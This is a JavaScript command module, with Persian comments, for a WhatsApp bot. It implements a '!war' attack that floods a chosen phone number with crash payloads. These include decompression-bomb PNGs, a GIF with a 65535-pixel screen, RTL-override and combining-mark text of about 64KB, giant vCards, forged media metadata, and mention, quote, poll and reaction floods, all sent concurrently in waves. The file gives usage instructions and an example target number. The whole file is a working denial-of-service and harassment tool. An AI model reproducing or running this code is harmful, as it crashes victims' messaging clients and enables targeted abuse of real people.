// ============================================
// WAR v1 — حمله همه‌جانبه (برای هندلر تو)
// محل: commands/war.js → دستور: !war
// متن flood: data/crash pro.js
// ============================================
import fs from "fs";
import path from "path";
import zlib from "zlib";
import Crypto from "crypto";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let STOP = false;
let payloadCache = null;

// ---------- شماره / JID ----------
const isPhone = (a) => typeof a === "string" && /^\d{8,15}$/.test(a);
const toJid = (n) => n.replace(/\D/g, "") + "@s.whatsapp.net";

function extractTarget(args) {
  const idx = args.findIndex(isPhone);
  if (idx === -1) return { target: null, rest: args };
  return { target: toJid(args[idx]), rest: [...args.slice(0, idx), ...args.slice(idx + 1)] };
}

async function sendTo(sock, target, content, from) {
  const to = target || from;
  try { return await sock.sendMessage(to, content); }
  catch (e) { console.log("WAR SEND ERROR:", to, e.message); return null; }
}

// ---------- پول کانکارنسی ----------
async function runPool(items, worker, concurrency = 6) {
  let i = 0, ok = 0;
  const n = items.length;
  async function loop() {
    while (!STOP) {
      const idx = i++;
      if (idx >= n) return;
      try { if (await worker(items[idx], idx)) ok++; } catch (_) {}
    }
  }
  await Promise.all(Array.from({ length: Math.min(concurrency, n) }, loop));
  return ok;
}

// ---------- کرپتو ----------
const CRYPTO_KEY = process.env.CPRO_KEY || "Cr4sh-Pr0-X0r-Key!";
function aesKey() { return Crypto.createHash("sha256").update(CRYPTO_KEY).digest(); }
function encryptPayload(buf, maxBytes = 60000) {
  const iv = Crypto.randomBytes(12);
  const c = Crypto.createCipheriv("aes-256-gcm", aesKey(), iv);
  const enc = Buffer.concat([c.update(buf), c.final()]);
  const tag = c.getAuthTag();
  let out = Buffer.concat([iv, tag, enc]).toString("base64");
  if (Buffer.byteLength(out, "utf8") > maxBytes) out = out.slice(0, maxBytes);
  return out;
}

// ---------- پنهان ----------
const MARKS = ["\u0300","\u0301","\u0302","\u0303","\u0304","\u0306","\u0307","\u0308",
  "\u030A","\u030B","\u030C","\u030F","\u0315","\u031B","\u0323","\u0327","\u0328","\u0334","\u0345"];
function padHidden(text, targetBytes = 60000) {
  let out = text;
  let cur = Buffer.byteLength(out, "utf8");
  if (cur >= targetBytes) return out.slice(0, targetBytes);
  out += "\u0627";
  cur += 2;
  let i = 0;
  while (cur + 2 <= targetBytes) { out += MARKS[i++ % MARKS.length]; cur += 2; }
  return out;
}

// ---------- متن از فایل ----------
const PAYLOAD_PATHS = [
  path.join(__dirname, "data", "crash pro.js"),
  path.join(__dirname, "data", "crashpro.js"),
  path.join(__dirname, "data", "crash pro.txt"),
  path.join(__dirname, "crash pro.js"),
];
const FALLBACK = [
  "این پیام تستی برای سنجش عملکرد سیستم پیام‌رسان و پردازش متن‌های طولانی است.",
  "پیام دوم: ترکیب متن فارسی و علائم نگارشی برای سنگین‌کردن فرایند رندر.",
  "پیام سوم: پردازش حجم بالای متن در کلاینت.",
];

async function tryLoad(p) {
  const raw = fs.readFileSync(p, "utf8").replace(/^\uFEFF/, "").trim();
  if (!raw) return null;
  try {
    const j = JSON.parse(raw);
    if (Array.isArray(j)) { const a = j.filter((x) => typeof x === "string" && x.trim()); if (a.length) return a; }
  } catch (_) {}
  if (p.endsWith(".js")) {
    try {
      const mod = await import(pathToFileURL(p).href + "?t=" + Date.now());
      const arr = Array.isArray(mod.default) ? mod.default : Array.isArray(mod) ? mod : null;
      if (arr) { const c = arr.filter((x) => typeof x === "string" && x.trim()); if (c.length) return c; }
    } catch (_) {}
  }
  const lines = raw.split(/\r?\n/).map((s) => s.trim()).filter((s) => s && !s.startsWith("#") && !s.startsWith("//"));
  return lines.length ? lines : null;
}

async function loadPayloads(force = false) {
  if (payloadCache && !force) return payloadCache;
  for (const p of PAYLOAD_PATHS) {
    if (!fs.existsSync(p)) continue;
    try { const a = await tryLoad(p); if (a && a.length) { payloadCache = a; console.log("WAR: فایل:", p, "→", a.length, "پیام"); return a; } } catch (_) {}
  }
  payloadCache = FALLBACK;
  console.log("WAR: متن پیش‌فرض");
  return payloadCache;
}

// ---------- PNG (استریم — سبک برای ترموکس) ----------
const CRC_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c >>> 0;
  }
  return t;
})();
function crc32(buf) {
  let c = 0xffffffff;
  for (let i = 0; i < buf.length; i++) c = CRC_TABLE[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}
function pngChunk(type, data) {
  if (!Buffer.isBuffer(data)) data = Buffer.from(data);
  const t = Buffer.from(type, "ascii");
  const out = Buffer.alloc(12 + data.length);
  out.writeUInt32BE(data.length, 0);
  t.copy(out, 4);
  data.copy(out, 8);
  const crcBuf = Buffer.allocUnsafe(4 + data.length);
  t.copy(crcBuf, 0);
  data.copy(crcBuf, 4);
  out.writeUInt32BE(crc32(crcBuf), 8 + data.length);
  return out;
}

const PNG_MAX = 9000;
const PNG_EXTREME = 12000;

function makeBombPng(w, h, rgb) {
  w = Math.max(1, Math.min(w | 0, 16000));
  h = Math.max(1, Math.min(h | 0, 16000));
  const [r, g, b] = rgb;
  return new Promise((resolve, reject) => {
    const row = Buffer.allocUnsafe(1 + w * 3);
    row[0] = 0;
    for (let x = 0, p = 1; x < w; x++) { row[p++] = r; row[p++] = g; row[p++] = b; }
    const d = zlib.createDeflate({ level: 9, chunkSize: 32 * 1024 });
    const out = [];
    d.on("data", (c) => out.push(c));
    d.on("error", reject);
    d.on("end", () => {
      try {
        const ihdr = Buffer.alloc(13);
        ihdr.writeUInt32BE(w, 0);
        ihdr.writeUInt32BE(h, 4);
        ihdr[8] = 8; ihdr[9] = 2; ihdr[10] = 0; ihdr[11] = 0; ihdr[12] = 0;
        const sig = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]);
        resolve(Buffer.concat([sig, pngChunk("IHDR", ihdr), pngChunk("IDAT", Buffer.concat(out)), pngChunk("IEND", Buffer.alloc(0))]));
      } catch (e) { reject(e); }
    });
    let y = 0;
    const pump = () => {
      try {
        if (y >= h) { d.end(); return; }
        const end = Math.min(y + 100, h);
        for (; y < end; y++) { if (!d.write(Buffer.from(row))) { d.once("drain", pump); return; } }
        setImmediate(pump);
      } catch (e) { reject(e); }
    };
    pump();
  });
}

const pngCache = new Map();
async function getPng(w, h, color) {
  const key = `${w}x${h}#${color.join(",")}`;
  if (!pngCache.has(key)) {
    console.log(`WAR: ساخت PNG ${w}x${h}...`);
    pngCache.set(key, await makeBombPng(w, h, color));
  }
  return pngCache.get(key);
}

// ---------- GIF صفحه ۶۵۵۳۵² ----------
function encodeSolidGifStable(minCodeSize, totalPixels) {
  const clear = 1 << minCodeSize;
  const eoi = clear + 1;
  let codeSize = minCodeSize + 1;
  let nextCode = eoi + 1;
  const dict = new Map();
  const bits = [];
  const writeCode = (code) => { for (let i = 0; i < codeSize; i++) bits.push((code >> i) & 1); };
  writeCode(clear);
  let w = String.fromCharCode(0);
  for (let i = 1; i < totalPixels; i++) {
    const c = String.fromCharCode(0);
    const wc = w + c;
    if (dict.has(wc)) w = wc;
    else {
      writeCode(w.length === 1 ? w.charCodeAt(0) : dict.get(w));
      if (nextCode < 4096) { dict.set(wc, nextCode++); if (nextCode > (1 << codeSize) && codeSize < 12) codeSize++; }
      else { writeCode(clear); dict.clear(); codeSize = minCodeSize + 1; nextCode = eoi + 1; }
      w = c;
    }
  }
  writeCode(w.length === 1 ? w.charCodeAt(0) : dict.get(w));
  writeCode(eoi);
  const bytes = [];
  for (let i = 0; i < bits.length; i += 8) {
    let b = 0;
    for (let j = 0; j < 8 && i + j < bits.length; j++) b |= bits[i + j] << j;
    bytes.push(b);
  }
  return bytes;
}

function makeGifScreenBomb() {
  const lsd = Buffer.alloc(7);
  lsd.writeUInt16LE(65535, 0);
  lsd.writeUInt16LE(65535, 2);
  lsd[4] = 0x80; lsd[5] = 0; lsd[6] = 0;
  const gct = Buffer.from([0, 0, 0, 255, 255, 255]);
  const imgDesc = Buffer.alloc(10);
  imgDesc[0] = 0x2c;
  imgDesc.writeUInt16LE(0, 1);
  imgDesc.writeUInt16LE(0, 3);
  imgDesc.writeUInt16LE(1, 5);
  imgDesc.writeUInt16LE(1, 7);
  imgDesc[9] = 0;
  const data = encodeSolidGifStable(2, 1);
  return Buffer.concat([
    Buffer.from("GIF89a"), lsd, gct, imgDesc,
    Buffer.from([2]), Buffer.from([data.length]), Buffer.from(data),
    Buffer.from([0]), Buffer.from([0x3b]),
  ]);
}

// ---------- WAV ----------
function makeWav(seconds, sampleRate = 8000) {
  const n = sampleRate * seconds;
  const data = Buffer.alloc(n * 2);
  const hdr = Buffer.alloc(44);
  hdr.write("RIFF", 0);
  hdr.writeUInt32LE(36 + data.length, 4);
  hdr.write("WAVE", 8);
  hdr.write("fmt ", 12);
  hdr.writeUInt32LE(16, 16);
  hdr.writeUInt16LE(1, 20);
  hdr.writeUInt16LE(1, 22);
  hdr.writeUInt32LE(sampleRate, 24);
  hdr.writeUInt32LE(sampleRate * 2, 28);
  hdr.writeUInt16LE(2, 32);
  hdr.writeUInt16LE(16, 34);
  hdr.write("data", 36);
  hdr.writeUInt32LE(data.length, 40);
  return Buffer.concat([hdr, data]);
}

// ---------- vCard ----------
const nameParts = ["محمد", "علی", "احمد", "حسین", "رضا", "مهدی"];
function giantName(len) {
  let s = "";
  while (s.length < len) s += nameParts[(Math.random() * nameParts.length) | 0] + "\u200B\u0651\u064E\u0650\u202E\uFE0F";
  return s.slice(0, len);
}
function makeVcardBomb(count = 60, nameLen = 1500) {
  let out = "";
  for (let i = 0; i < count; i++) {
    const nm = giantName(nameLen);
    out += `BEGIN:VCARD\nVERSION:3.0\nN:${nm};;;\nFN:${nm}\nTEL;TYPE=CELL:+93700000000\nEND:VCARD\n`;
  }
  return Buffer.from(out, "utf8");
}

// ============================================
// سلاح‌ها
// ============================================

async function textFlood(sock, target, count, mode, from) {
  const payloads = await loadPayloads();
  const items = Array.from({ length: count }, (_, i) => payloads[i % payloads.length]);
  return runPool(items, (txt) => {
    let text = txt;
    if (mode === "crypto") text = encryptPayload(Buffer.from(txt, "utf8"));
    else if (mode === "hidden") text = padHidden(txt);
    return sendTo(sock, target, { text }, from);
  }, mode === "hidden" ? 6 : 10);
}

function makeLinePayload(targetBytes = 65500) {
  const unit = "\u202Eا\u0651\u064E\u0650\uFE0F\u200D";
  let s = "";
  while (Buffer.byteLength(s, "utf8") < targetBytes) s += unit;
  return Buffer.from(s, "utf8").subarray(0, targetBytes).toString("utf8").replace(/\uFFFD/g, "");
}

async function lineAttack(sock, target, count, from) {
  const payload = makeLinePayload();
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, () => sendTo(sock, target, { text: payload }, from), 6);
}

async function mentionAttack(sock, target, count, from) {
  const jids = Array.from({ length: 120 }, (_, i) =>
    i % 2 === 0 ? target : toJid("9370" + String(10000000 + ((i * 7919) % 89999999))));
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    text: "\u200B".repeat(500) + "@" + i,
    mentions: jids,
  }, from), 6);
}

async function quoteBomb(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    text: "q" + i,
    contextInfo: {
      quotedMessage: {
        imageMessage: {
          url: "https://example.com/x.png",
          mimetype: "image/png",
          caption: "\u200B".repeat(30000) + "⚫".repeat(30000),
          width: 65535,
          height: 65535,
          jpegThumbnail: Buffer.alloc(0),
        },
      },
    },
  }, from), 5);
}

async function metaBomb(sock, target, count, from) {
  const tiny = await getPng(16, 16, [255, 0, 0]);
  const tinyWav = makeWav(1);
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => {
    const kind = i % 4;
    if (kind === 0) return sendTo(sock, target, {
      image: tiny, mimetype: "image/png", width: 65535, height: 65535,
      fileLength: 0x7fffffff, caption: "\u200B".repeat(3000) + "x",
    }, from);
    if (kind === 1) return sendTo(sock, target, {
      audio: tinyWav, mimetype: "audio/wav", ptt: true, seconds: 0xffffffff,
    }, from);
    if (kind === 2) return sendTo(sock, target, {
      document: tiny, mimetype: "image/png", fileName: "scan.png",
      fileLength: 0x7fffffff, pageCount: 65535,
    }, from);
    return sendTo(sock, target, {
      image: tiny, mimetype: "image/png", viewOnce: true,
      width: 65535, height: 65535, fileLength: 0x7fffffff,
    }, from);
  }, 5);
}

async function cardAttack(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    contacts: {
      displayName: giantName(30000) + i,
      contacts: Array.from({ length: 20 }, (_, k) => ({
        vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + giantName(5000) + k + "\nEND:VCARD",
      })),
    },
  }, from), 3);
}

async function mediaAttack(sock, target, count, extreme, from) {
  const base = extreme ? PNG_EXTREME : PNG_MAX;
  const sizes = [
    [base, base, [255, 0, 0]],
    [Math.floor(base * 0.85), Math.floor(base * 0.85), [0, 255, 0]],
    [Math.floor(base * 0.7), Math.floor(base * 0.7), [0, 0, 255]],
  ];
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, async (i) => {
    const [w, h, c] = sizes[i % sizes.length];
    const img = await getPng(w, h, c);
    const content = { image: img, caption: "b" + i, mimetype: "image/png" };
    if (extreme) content.viewOnce = true;
    return sendTo(sock, target, content, from);
  }, extreme ? 3 : 2);
}

async function voiceAttack(sock, target, count, from) {
  const wav = makeWav(10);
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, () => sendTo(sock, target, { audio: wav, mimetype: "audio/wav", ptt: true }, from), 5);
}

async function reactAttack(sock, target, count, from) {
  const emojis = ["😈", "💥", "🔥", "💀", "😵", "🤯", "👹", "🖕"];
  let ok = 0;
  for (let i = 0; i < count && !STOP; i++) {
    const sent = await sendTo(sock, target, { text: "⚫" + i }, from);
    if (!sent) continue;
    try {
      await sock.sendMessage(target || from, { react: { text: emojis[i % emojis.length], key: sent.key } });
      ok++;
    } catch (_) {}
    await sleep(100);
  }
  return ok;
}

async function locAttack(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    location: { degreesLatitude: 31.5 + i * 0.001, degreesLongitude: 63.3 + i * 0.001 },
  }, from), 6);
}

async function pollAttack(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    poll: {
      name: "\u200B".repeat(50000) + "نظر" + i,
      values: Array.from({ length: 12 }, (_, k) => "\u200B".repeat(80) + "گزینه" + k),
      selectableCount: 1,
    },
  }, from), 4);
}

// ============================================
// جنگ — همه سلاح‌ها هم‌زمان
// ============================================
async function war(sock, target, rounds, mode, extreme, from) {
  const out = {};
  for (let r = 0; r < rounds && !STOP; r++) {
    const [a, b, c, d, e, f, g, h, i, j, k] = await Promise.all([
      textFlood(sock, target, 6, mode, from),
      lineAttack(sock, target, 2, from),
      mentionAttack(sock, target, 3, from),
      quoteBomb(sock, target, 3, from),
      metaBomb(sock, target, 2, from),
      cardAttack(sock, target, 1, from),
      mediaAttack(sock, target, extreme ? 2 : 1, extreme, from),
      voiceAttack(sock, target, 2, from),
      reactAttack(sock, target, 3, from),
      locAttack(sock, target, 3, from),
      pollAttack(sock, target, 1, from),
    ]);
    out.t = (out.t || 0) + a;
    out.line = (out.line || 0) + b;
    out.mention = (out.mention || 0) + c;
    out.quote = (out.quote || 0) + d;
    out.meta = (out.meta || 0) + e;
    out.card = (out.card || 0) + f;
    out.media = (out.media || 0) + g;
    out.voice = (out.voice || 0) + h;
    out.react = (out.react || 0) + i;
    out.loc = (out.loc || 0) + j;
    out.poll = (out.poll || 0) + k;
    if (r === 0) {
      try {
        await sendTo(sock, target, { image: extreme ? await getPng(PNG_EXTREME, PNG_EXTREME, [255, 0, 0]) : await getPng(PNG_MAX, PNG_MAX, [255, 0, 0]), caption: "photo", mimetype: "image/png" }, from);
        await sendTo(sock, target, { image: makeGifScreenBomb(), caption: "gif", mimetype: "image/gif" }, from);
        await sendTo(sock, target, { document: makeVcardBomb(), mimetype: "text/x-vcard", fileName: "contacts.vcf" }, from);
      } catch (_) {}
    }
    await sleep(300);
  }
  return out;
}

// ============================================
// هندلر
// ============================================
export default async function warCmd(sock, from, body, m, args) {
  try {
    STOP = false;
    const { target, rest } = extractTarget(args);
    const who = target ? target.replace("@s.whatsapp.net", "") : "چت فعلی";
    const extreme = rest.includes("extreme");
    const mode = rest.includes("crypto") ? "crypto" : rest.includes("hidden") ? "hidden" : "normal";
    const rest2 = rest.filter((a) => !["extreme", "crypto", "hidden", "normal"].includes(a));

    if (rest2.length === 0) {
      await sock.sendMessage(from, {
        text:
          "⚔️ WAR v1\n\n" +
          "!war <n> [extreme] [crypto|hidden] [شماره]\n" +
          "!war stop\n" +
          "!war info\n\n" +
          "مثال: !war 5 extreme hidden 93794394088\n" +
          "n = تعداد موج‌ها (هر موج ~۲۶ پیام سنگین)",
      });
      return;
    }

    const first = rest2[0].toLowerCase();
    const getN = (def, max = 20) => {
      const num = rest2.slice(1).find((a) => /^\d{1,3}$/.test(a));
      return Math.min(parseInt(num, 10) || def, max);
    };

    if (first === "stop") {
      STOP = true;
      await sock.sendMessage(from, { text: "🛑 جنگ متوقف شد." });
      return;
    }

    if (first === "info") {
      const payloads = await loadPayloads();
      await sock.sendMessage(from, {
        text: `📊 WAR INFO\nمتن‌های فایل: ${payloads.length}\nحالت: ${mode}${extreme ? " [EXTREME]" : ""}`,
      });
      return;
    }

    const n = getN(3);
    await sock.sendMessage(from, { text: `⚔️ جنگ شروع شد → ${who} (${n} موج, ${mode}${extreme ? ", EXTREME" : ""})` });
    const res = await war(sock, target, n, mode, extreme, from);
    await sock.sendMessage(from, {
      text:
        `🏁 WAR تمام شد → ${who}\n` +
        `متن: ${res.t || 0} | خط: ${res.line || 0} | منشن: ${res.mention || 0} | نقل‌قول: ${res.quote || 0}\n` +
        `متدیتا: ${res.meta || 0} | کارت: ${res.card || 0} | تصویر: ${res.media || 0} | وویس: ${res.voice || 0}\n` +
        `ریکشن: ${res.react || 0} | مکان: ${res.loc || 0} | پول: ${res.poll || 0}`,
    });
  } catch (e) {
    console.log("WAR ERROR:", e);
    try { await sock.sendMessage(from, { text: "❌ خطا: " + (e && e.message ? e.message : e) }); } catch (_) {}
  }
}